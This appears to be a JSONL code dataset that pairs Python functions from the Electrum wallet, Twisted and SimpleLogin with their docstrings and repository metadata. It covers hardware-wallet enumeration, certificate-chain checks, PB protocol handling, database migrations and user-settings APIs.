{"docstring": "# If there is a bridge, prefer that.\n# On Windows, the bridge runs as Admin (and Electrum usually does not),\n# so the bridge has better chances of finding devices. see #5420\n# This also avoids duplicate entries.\n", "func_signal": "def enumerate(self):\n", "code": "if self.is_bridge_available():\n    devices = BridgeTransport.enumerate()\nelse:\n    devices = trezorlib.transport.enumerate_devices()\nreturn [Device(path=d.get_path(),\n               interface_number=-1,\n               id_=d.get_path(),\n               product_key=TREZOR_PRODUCT_KEY,\n               usage_page=0,\n               transport_ui_string=d.get_path())\n        for d in devices]", "path": "electrum/electrum/plugins/trezor/trezor.py", "commit_date": "2020-09-08 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"\nReturns the TOS for the given billing plan as a plain/text unicode string.\n:param billing_plan: the plan to return the terms for\n\"\"\"\n", "func_signal": "def get_terms_of_service(self, billing_plan='electrum-per-tx-otp'):\n", "code": "payload = {'billing_plan': billing_plan}\nreturn self.send_request('get', 'tos', payload)", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"\nAttempt to authenticate for a particular cosigner.\n:param id: the id of the cosigner\n:param otp: the one time password\n\"\"\"\n", "func_signal": "def auth(self, id, otp):\n", "code": "payload = {'otp': otp}\nreturn self.send_request('post', 'cosigner/%s/auth' % quote(id), payload)", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Just like safetlib.transport.enumerate_devices,\nbut with exception catching, so that transports can fail separately.\n\"\"\"\n", "func_signal": "def enumerate_devices(self):\n", "code": "devices = []\nfor transport in self.all_transports():\n    try:\n        new_devices = transport.enumerate()\n    except BaseException as e:\n        _logger.info(f'enumerate failed for {transport.__name__}. error {e}')\n    else:\n        devices.extend(new_devices)\nreturn devices", "path": "electrum/electrum/plugins/safe_t/transport.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\" Verify a chain of certificates. The last certificate is the CA\"\"\"\n", "func_signal": "def verify_cert_chain(chain):\n", "code": "load_ca_list()\n# parse the chain\ncert_num = len(chain)\nx509_chain = []\nfor i in range(cert_num):\n    x = x509.X509(bytearray(chain[i]))\n    x509_chain.append(x)\n    if i == 0:\n        x.check_date()\n    else:\n        if not x.check_ca():\n            raise Exception(\"ERROR: Supplied CA Certificate Error\")\nif not cert_num > 1:\n    raise Exception(\"ERROR: CA Certificate Chain Not Provided by Payment Processor\")\n# if the root CA is not supplied, add it to the chain\nca = x509_chain[cert_num-1]\nif ca.getFingerprint() not in ca_list:\n    keyID = ca.get_issuer_keyID()\n    f = ca_keyID.get(keyID)\n    if f:\n        root = ca_list[f]\n        x509_chain.append(root)\n    else:\n        raise Exception(\"Supplied CA Not Found in Trusted CA Store.\")\n# verify the chain of signatures\ncert_num = len(x509_chain)\nfor i in range(1, cert_num):\n    x = x509_chain[i]\n    prev_x = x509_chain[i-1]\n    algo, sig, data = prev_x.get_signature()\n    sig = bytearray(sig)\n    pubkey = rsakey.RSAKey(x.modulus, x.exponent)\n    if algo == x509.ALGO_RSA_SHA1:\n        verify = pubkey.hashAndVerify(sig, data)\n    elif algo == x509.ALGO_RSA_SHA256:\n        hashBytes = bytearray(hashlib.sha256(data).digest())\n        verify = pubkey.verify(sig, x509.PREFIX_RSA_SHA256 + hashBytes)\n    elif algo == x509.ALGO_RSA_SHA384:\n        hashBytes = bytearray(hashlib.sha384(data).digest())\n        verify = pubkey.verify(sig, x509.PREFIX_RSA_SHA384 + hashBytes)\n    elif algo == x509.ALGO_RSA_SHA512:\n        hashBytes = bytearray(hashlib.sha512(data).digest())\n        verify = pubkey.verify(sig, x509.PREFIX_RSA_SHA512 + hashBytes)\n    else:\n        raise Exception(\"Algorithm not supported: {}\".format(algo))\n    if not verify:\n        raise Exception(\"Certificate not Signed by Provided CA Certificate Chain\")\n\nreturn x509_chain[0], ca", "path": "electrum/electrum/paymentrequest.py", "commit_date": "2020-06-22 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"\nTransfer a cosigner's credits to another cosigner.\n:param id: the id of the sending cosigner\n:param recipient: the id of the recipient cosigner\n:param otp: the one time password (of the sender)\n:param signature_callback: a callback that signs a text message using xpubkey1/0/0 returning a compact sig\n\"\"\"\n", "func_signal": "def transfer_credit(self, id, recipient, otp, signature_callback):\n", "code": "payload = {\n    'otp': otp,\n    'recipient': recipient,\n    'timestamp': int(time.time()),\n\n}\nrelative_url = 'cosigner/%s/transfer' % quote(id)\nfull_url = urljoin(self.base_url, relative_url)\nheaders = {\n    'x-signature': signature_callback(full_url + '\\n' + json.dumps(payload))\n}\nreturn self.send_request('post', relative_url, payload, headers)", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "# Testing whether the Bridge is available can take several seconds\n# (when it is not), as it is slow to timeout, hence we cache it.\n", "func_signal": "def is_bridge_available(self) -> bool:\n", "code": "if self._is_bridge_available is None:\n    try:\n        call_bridge(\"enumerate\")\n    except Exception:\n        self._is_bridge_available = False\n        # never again try with Bridge due to slow timeout\n        BridgeTransport.ENABLED = False\n    else:\n        self._is_bridge_available = True\nreturn self._is_bridge_available", "path": "electrum/electrum/plugins/trezor/trezor.py", "commit_date": "2020-09-08 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Decode a sequence of PEM blocks into a list of bytearrays.\n\nThe input must contain any number of PEM blocks, each with the appropriate\nPEM prefix and postfix based on the input name string, e.g. for\nname=\"TACK BREAK SIG\".  Arbitrary text can appear between and before and\nafter the PEM blocks.  For example:\n\n\" Created by TACK.py 0.9.3 Created at 2012-02-01T00:30:10Z -----BEGIN TACK\nBREAK SIG-----\nATKhrz5C6JHJW8BF5fLVrnQss6JnWVyEaC0p89LNhKPswvcC9/s6+vWLd9snYTUv\nYMEBdw69PUP8JB4AdqA3K6Ap0Fgd9SSTOECeAKOUAym8zcYaXUwpk0+WuPYa7Zmm\nSkbOlK4ywqt+amhWbg9txSGUwFO5tWUHT3QrnRlE/e3PeNFXLx5Bckg= -----END TACK\nBREAK SIG----- Created by TACK.py 0.9.3 Created at 2012-02-01T00:30:11Z\n-----BEGIN TACK BREAK SIG-----\nATKhrz5C6JHJW8BF5fLVrnQss6JnWVyEaC0p89LNhKPswvcC9/s6+vWLd9snYTUv\nYMEBdw69PUP8JB4AdqA3K6BVCWfcjN36lx6JwxmZQncS6sww7DecFO/qjSePCxwM\n+kdDqX/9/183nmjx6bf0ewhPXkA0nVXsDYZaydN8rJU1GaMlnjcIYxY= -----END TACK\nBREAK SIG----- \"\n\nAll such PEM blocks will be found, decoded, and return in an ordered list\nof bytearrays, which may have zero elements if not PEM blocks are found.\n \"\"\"\n", "func_signal": "def dePemList(s, name):\n", "code": "bList = []\nprefix  = \"-----BEGIN %s-----\" % name\npostfix = \"-----END %s-----\" % name\nwhile 1:\n    start = s.find(prefix)\n    if start == -1:\n        return bList\n    end = s.find(postfix, start+len(prefix))\n    if end == -1:\n        raise SyntaxError(\"Missing PEM postfix\")\n    s2 = s[start+len(prefix) : end]\n    retBytes = a2b_base64(s2) # May raise SyntaxError\n    bList.append(retBytes)\n    s = s[end+len(postfix) : ]", "path": "electrum/electrum/pem.py", "commit_date": "2018-07-13 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"wrapper for sql methods\"\"\"\n", "func_signal": "def sql(func):\n", "code": "def wrapper(self: 'SqlDB', *args, **kwargs):\n    assert threading.currentThread() != self.sql_thread\n    f = asyncio.Future()\n    self.db_requests.put((f, func, args, kwargs))\n    return f\nreturn wrapper", "path": "electrum/electrum/sql_db.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Encode a payload bytearray into a PEM string.\n\nThe input will be base64 encoded, then wrapped in a PEM prefix/postfix\nbased on the name string, e.g. for name=\"CERTIFICATE\":\n\n-----BEGIN CERTIFICATE-----\nMIIBXDCCAUSgAwIBAgIBADANBgkqhkiG9w0BAQUFADAPMQ0wCwYDVQQDEwRUQUNL\n...\nKoZIhvcNAQEFBQADAwA5kw==\n-----END CERTIFICATE-----    \n\"\"\"\n", "func_signal": "def pem(b, name):\n", "code": "s1 = b2a_base64(b)[:-1] # remove terminating \\n\ns2 = b\"\"\nwhile s1:\n    s2 += s1[:64] + b\"\\n\"\n    s1 = s1[64:]\ns = (\"-----BEGIN %s-----\\n\" % name).encode('ascii') + s2 + \\\n    (\"-----END %s-----\\n\" % name).encode('ascii')\nreturn s", "path": "electrum/electrum/pem.py", "commit_date": "2018-07-13 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"\nCreates a new cosigner resource.\n:param xpubkey1: a bip32 extended public key (customarily the hot key)\n:param xpubkey2: a bip32 extended public key (customarily the cold key)\n:param email: a contact email\n:param billing_plan: the billing plan for the cosigner\n\"\"\"\n", "func_signal": "def create(self, xpubkey1, xpubkey2, email, billing_plan='electrum-per-tx-otp'):\n", "code": "payload = {\n    'email': email,\n    'xpubkey1': xpubkey1,\n    'xpubkey2': xpubkey2,\n    'billing_plan': billing_plan,\n}\nreturn self.send_request('post', 'cosigner', payload)", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Parse a string containing a PEM-encoded <privateKey>.\"\"\"\n", "func_signal": "def parse_private_key(s):\n", "code": "if pemSniff(s, \"PRIVATE KEY\"):\n    bytes = dePem(s, \"PRIVATE KEY\")\n    return _parsePKCS8(bytes)\nelif pemSniff(s, \"RSA PRIVATE KEY\"):\n    bytes = dePem(s, \"RSA PRIVATE KEY\")\n    return _parseSSLeay(bytes)\nelse:\n    raise SyntaxError(\"Not a PEM private key file\")", "path": "electrum/electrum/pem.py", "commit_date": "2018-07-13 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\" Reset Google Auth secret \"\"\"\n", "func_signal": "def reset_auth(self, id, challenge, signatures):\n", "code": "payload = {'challenge':challenge, 'signatures':signatures}\nreturn self.send_request('post', 'cosigner/%s/otp_secret' % quote(id), payload)", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"\nInitialize. Called after Banana negotiation is done.\n\"\"\"\n", "func_signal": "def connectionReady(self):\n", "code": "self.sendCall(b\"version\", self.version)\nfor notifier in self.connects:\n    try:\n        notifier()\n    except BaseException:\n        log.deferr()\nself.connects = None\nself.factory.clientConnectionMade(self)", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nEnsure that the avatar to be returned to the client is jellyable and\nset up disconnection notification to call the realm's logout object.\n\"\"\"\n", "func_signal": "def _cbLogin(self, result):\n", "code": "(interface, avatar, logout) = result\nif not IJellyable.providedBy(avatar):\n    avatar = AsReferenceable(avatar, \"perspective\")\n\npuid = avatar.processUniqueID()\n\n# only call logout once, whether the connection is dropped (disconnect)\n# or a logout occurs (cleanup), and be careful to drop the reference to\n# it in either case\nlogout = [logout]\n\ndef maybeLogout():\n    if not logout:\n        return\n    fn = logout[0]\n    del logout[0]\n    fn()\n\nself.broker._localCleanup[puid] = maybeLogout\nself.broker.notifyOnDisconnect(maybeLogout)\n\nreturn avatar", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nCalled if we are disconnected and have callbacks registered.\n\"\"\"\n", "func_signal": "def _disconnected(self):\n", "code": "for callback in self.disconnectCallbacks:\n    callback(self)\nself.disconnectCallbacks = None", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nCollect state related to the exception which occurred, discarding\nstate which cannot reasonably be serialized.\n\"\"\"\n", "func_signal": "def getStateToCopy(self):\n", "code": "state = self.__dict__.copy()\nstate[\"tb\"] = None\nstate[\"frames\"] = []\nstate[\"stack\"] = []\nstate[\"value\"] = str(self.value)  # Exception instance\nif isinstance(self.type, bytes):\n    state[\"type\"] = self.type\nelse:\n    state[\"type\"] = reflect.qual(self.type).encode(\"utf-8\")  # Exception class\nif self.unsafeTracebacks:\n    state[\"traceback\"] = self.getTraceback()\nelse:\n    state[\"traceback\"] = \"Traceback unavailable\\n\"\nreturn state", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nMultiple C{--auth} command-line options will add all checkers specified\nto the list ofcheckers, and there should only be the specified auth\ncheckers (no default checkers).\n\"\"\"\n", "func_signal": "def test_multipleAuthAdded(self):\n", "code": "self.options.parseOptions(\n    [\n        \"--auth\",\n        \"file:\" + self.filename,\n        \"--auth\",\n        \"memory:testuser:testpassword\",\n    ]\n)\nself.assertEqual(len(self.options[\"credCheckers\"]), 2)", "path": "twisted/src/twisted/conch/test/test_tap.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\n(internal) Send an error for a previously sent message.\n\n@param fail: The failure.\n@param requestID: The request ID.\n\"\"\"\n", "func_signal": "def _sendError(self, fail, requestID):\n", "code": "if isinstance(fail, failure.Failure):\n    # If the failures value is jellyable or allowed through security,\n    # send the value\n    if isinstance(fail.value, Jellyable) or self.security.isClassAllowed(\n        fail.value.__class__\n    ):\n        fail = fail.value\n    elif not isinstance(fail, CopyableFailure):\n        fail = failure2Copyable(fail, self.factory.unsafeTracebacks)\nif isinstance(fail, CopyableFailure):\n    fail.unsafeTracebacks = self.factory.unsafeTracebacks\nself.sendCall(b\"error\", requestID, self.serialize(fail))", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"(internal) Initialize me with a broker and a locally-unique ID.\n\nThe ID is unique only to the particular Perspective Broker\ninstance.\n\"\"\"\n", "func_signal": "def __init__(self, perspective, broker, luid, doRefCount):\n", "code": "self.luid = luid\nself.broker = broker\nself.doRefCount = doRefCount\nself.perspective = perspective\nself.disconnectCallbacks = []", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nL{tap.makeService} returns a L{StreamServerEndpointService} instance\nrunning on TCP port 22, and the linked protocol factory is an instance\nof L{OpenSSHFactory}.\n\"\"\"\n", "func_signal": "def test_basic(self):\n", "code": "config = tap.Options()\nservice = tap.makeService(config)\nself.assertIsInstance(service, StreamServerEndpointService)\nself.assertEqual(service.endpoint._port, 22)\nself.assertIsInstance(service.factory, OpenSSHFactory)", "path": "twisted/src/twisted/conch/test/test_tap.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nIncrement the reference count.\n\n@return: the reference count after incrementing\n\"\"\"\n", "func_signal": "def incref(self):\n", "code": "self.refcount = self.refcount + 1\nreturn self.refcount", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nThis method is called when a network message is received.\n\nThis will call::\n\n    self.perspective_%(message)s(*broker.unserialize(args),\n                                 **broker.unserialize(kw))\n\nto handle the method; subclasses of Avatar are expected to\nimplement methods using this naming convention.\n\"\"\"\n\n", "func_signal": "def perspectiveMessageReceived(self, broker, message, args, kw):\n", "code": "args = broker.unserialize(args, self)\nkw = broker.unserialize(kw, self)\nmethod = getattr(self, \"perspective_%s\" % message)\ntry:\n    state = method(*args, **kw)\nexcept TypeError:\n    log.msg(\"{} didn't accept {} and {}\".format(method, args, kw))\n    raise\nreturn broker.serialize(state, self, method, args, kw)", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\n\n@param instance: The instance to look up.\n@param incref: Flag to specify whether to increment the\n               reference.\n@return: An ID that says what this instance is cached as\n         remotely, or L{None} if it's not.\n\"\"\"\n\n", "func_signal": "def cachedRemotelyAs(self, instance, incref=0):\n", "code": "puid = instance.processUniqueID()\nluid = self.remotelyCachedLUIDs.get(puid)\nif (luid is not None) and (incref):\n    self.remotelyCachedObjects[luid].incref()\nreturn luid", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nProtocol message: (version version-number)\n\nCheck to make sure that both ends of the protocol are speaking\nthe same version dialect.\n\n@param vnum: The version number.\n\"\"\"\n\n", "func_signal": "def proto_version(self, vnum):\n", "code": "if vnum != self.version:\n    raise ProtocolError(\n        \"Version Incompatibility: {} {}\".format(self.version, vnum)\n    )", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nEvaluate an expression as it's received.\n\"\"\"\n", "func_signal": "def expressionReceived(self, sexp):\n", "code": "if isinstance(sexp, list):\n    command = sexp[0]\n\n    if not isinstance(command, str):\n        command = command.decode(\"utf8\")\n\n    methodName = \"proto_%s\" % command\n    method = getattr(self, methodName, None)\n\n    if method:\n        method(*sexp[1:])\n    else:\n        self.sendCall(b\"didNotUnderstand\", command)\nelse:\n    raise ProtocolError(\"Non-list expression received.\")", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nThe checker created by the C{--auth} command-line option returns a\nL{Deferred} that fails with L{UnauthorizedLogin} when\npresented with credentials that are unknown to that checker.\n\"\"\"\n", "func_signal": "def test_authFailure(self):\n", "code": "self.options.parseOptions([\"--auth\", \"file:\" + self.filename])\nchecker = self.options[\"credCheckers\"][-1]\ninvalid = UsernamePassword(self.usernamePassword[0], \"fake\")\n# Wrong password should raise error\nreturn self.assertFailure(\n    checker.requestAvatarId(invalid), error.UnauthorizedLogin\n)", "path": "twisted/src/twisted/conch/test/test_tap.py", "commit_date": "2020-10-22 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nInitialize with a L{RemoteReference} and the name of this message.\n\"\"\"\n", "func_signal": "def __init__(self, obj, name):\n", "code": "self.obj = obj\nself.name = name", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nStore a special (string) ID for this object.\n\nThis is how you specify a 'base' set of objects that the remote\nprotocol can connect to.\n\n@param name: An ID.\n@param object: The object.\n\"\"\"\n", "func_signal": "def setNameForLocal(self, name, object):\n", "code": "if isinstance(name, str):\n    name = name.encode(\"utf8\")\n\nassert object is not None\nself.localObjects[name] = Local(object)", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nLog error and then send it.\n\n@param fail: The failure.\n@param requestID: The request ID.\n\"\"\"\n", "func_signal": "def _sendFailure(self, fail, requestID):\n", "code": "log.msg(\"Peer will receive following PB traceback:\")\nlog.err(fail)\nself._sendError(fail, requestID)", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nLogin and get perspective from remote PB server.\n\nCurrently the following credentials are supported::\n\n    L{twisted.cred.credentials.IUsernamePassword}\n    L{twisted.cred.credentials.IAnonymous}\n\n@rtype: L{Deferred}\n@return: A L{Deferred} which will be called back with a\n    L{RemoteReference} for the avatar logged in to, or which will\n    errback if login fails.\n\"\"\"\n", "func_signal": "def login(self, credentials, client=None):\n", "code": "d = self.getRootObject()\n\nif IAnonymous.providedBy(credentials):\n    d.addCallback(self._cbLoginAnonymous, client)\nelse:\n    d.addCallback(\n        self._cbSendUsername, credentials.username, credentials.password, client\n    )\nreturn d", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\n\n@param notifier: callback to call when the Broker connects.\n\"\"\"\n", "func_signal": "def notifyOnConnect(self, notifier):\n", "code": "assert callable(notifier)\nif self.connects is None:\n    try:\n        notifier()\n    except BaseException:\n        log.err()\nelse:\n    self.connects.append(notifier)", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "\"\"\"\nGet root object of remote PB server.\n\n@return: Deferred of the root object.\n\"\"\"\n", "func_signal": "def getRootObject(self):\n", "code": "if self._broker and not self._broker.disconnected:\n    return defer.succeed(self._root)\nd = defer.Deferred()\nself.rootObjectRequests.append(d)\nreturn d", "path": "twisted/src/twisted/spread/pb.py", "commit_date": "2020-10-26 00:00:00", "repo_name": "twisted/twisted", "stars": 5374, "license": "other", "language": "python", "size": 74319}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('api_key',\nsa.Column('id', sa.Integer(), autoincrement=True, nullable=False),\nsa.Column('created_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=False),\nsa.Column('updated_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('user_id', sa.Integer(), nullable=False),\nsa.Column('code', sa.String(length=128), nullable=False),\nsa.Column('name', sa.String(length=128), nullable=False),\nsa.Column('last_used', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('times', sa.Integer(), nullable=False),\nsa.ForeignKeyConstraint(['user_id'], ['users.id'], ondelete='cascade'),\nsa.PrimaryKeyConstraint('id'),\nsa.UniqueConstraint('code')\n)\nop.create_table('alias_used_on',\nsa.Column('id', sa.Integer(), autoincrement=True, nullable=False),\nsa.Column('created_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=False),\nsa.Column('updated_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('gen_email_id', sa.Integer(), nullable=False),\nsa.Column('hostname', sa.String(length=1024), nullable=False),\nsa.ForeignKeyConstraint(['gen_email_id'], ['gen_email.id'], ondelete='cascade'),\nsa.PrimaryKeyConstraint('id'),\nsa.UniqueConstraint('gen_email_id', 'hostname', name='uq_alias_used')\n)\n# ### end Alembic commands ###", "path": "app/migrations/versions/e505cb517589_.py", "commit_date": "2019-12-15 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "\"\"\"make sure user unverified mailbox is not shown to user\"\"\"\n", "func_signal": "def test_not_show_unverified_mailbox(flask_client):\n", "code": "user = login(flask_client)\ndb.session.commit()\n\nMailbox.create(user_id=user.id, email=\"m1@example.com\", verified=True)\nMailbox.create(user_id=user.id, email=\"m2@example.com\", verified=False)\ndb.session.commit()\n\nr = flask_client.get(url_for(\"dashboard.custom_alias\"))\n\nassert \"m1@example.com\" in str(r.data)\nassert \"m2@example.com\" not in str(r.data)", "path": "app/tests/dashboard/test_custom_alias.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.alter_column(\"users\", \"sender_format\", server_default=None)\nop.alter_column(\n    \"users\",\n    \"sender_format\",\n    new_column_name=\"use_via_format_for_sender\",\n    type_=sa.Boolean(),\n    postgresql_using=\"sender_format::boolean\",\n)\nop.alter_column(\"users\", \"use_via_format_for_sender\", server_default=\"1\")\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_051515_5cad8fa84386_.py", "commit_date": "2020-05-16 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.alter_column(\"users\", \"use_via_format_for_sender\", server_default=None)\nop.alter_column(\n    \"users\",\n    \"use_via_format_for_sender\",\n    new_column_name=\"sender_format\",\n    type_=sa.Integer(),\n    postgresql_using=\"use_via_format_for_sender::integer\",\n)\nop.alter_column(\"users\", \"sender_format\", server_default=\"1\")\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_051515_5cad8fa84386_.py", "commit_date": "2020-05-16 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_table('alias_used_on')\nop.drop_table('api_key')\n# ### end Alembic commands ###", "path": "app/migrations/versions/e505cb517589_.py", "commit_date": "2019-12-15 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('lifetime_coupon',\nsa.Column('id', sa.Integer(), autoincrement=True, nullable=False),\nsa.Column('created_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=False),\nsa.Column('updated_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('code', sa.String(length=128), nullable=False),\nsa.Column('nb_used', sa.Integer(), nullable=False),\nsa.PrimaryKeyConstraint('id'),\nsa.UniqueConstraint('code')\n)\nop.add_column('users', sa.Column('lifetime', sa.Boolean(), server_default='0', nullable=False))\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_010120_d29cca963221_.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "\"\"\"\nUpdate user setting\nInput:\n- notification: bool\n- alias_generator: word|uuid\n- random_alias_default_domain: str\n\"\"\"\n", "func_signal": "def update_setting():\n", "code": "user = g.user\ndata = request.get_json() or {}\n\nif \"notification\" in data:\n    user.notification = data[\"notification\"]\n\nif \"alias_generator\" in data:\n    alias_generator = data[\"alias_generator\"]\n    if alias_generator not in [\"word\", \"uuid\"]:\n        return jsonify(error=\"Invalid alias_generator\"), 400\n\n    if alias_generator == \"word\":\n        user.alias_generator = AliasGeneratorEnum.word.value\n    else:\n        user.alias_generator = AliasGeneratorEnum.uuid.value\n\nif \"sender_format\" in data:\n    sender_format = data[\"sender_format\"]\n    if not SenderFormatEnum.has_name(sender_format):\n        return jsonify(error=\"Invalid sender_format\"), 400\n\n    user.sender_format = SenderFormatEnum.get_value(sender_format)\n\nif \"random_alias_default_domain\" in data:\n    default_domain = data[\"random_alias_default_domain\"]\n    sl_domain: SLDomain = SLDomain.get_by(domain=default_domain)\n    if sl_domain:\n        if sl_domain.premium_only and not user.is_premium():\n            return jsonify(error=\"You cannot use this domain\"), 400\n\n        user.default_alias_public_domain_id = sl_domain.id\n        user.default_alias_custom_domain_id = None\n    else:\n        custom_domain = CustomDomain.get_by(domain=default_domain)\n        if not custom_domain:\n            return jsonify(error=\"invalid domain\"), 400\n\n        # sanity check\n        if custom_domain.user_id != user.id or not custom_domain.verified:\n            LOG.exception(\"%s cannot use domain %s\", user, default_domain)\n            return jsonify(error=\"invalid domain\"), 400\n        else:\n            user.default_alias_custom_domain_id = custom_domain.id\n            user.default_alias_public_domain_id = None\n\ndb.session.commit()\nreturn jsonify(setting_to_dict(user))", "path": "app/app/api/views/setting.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
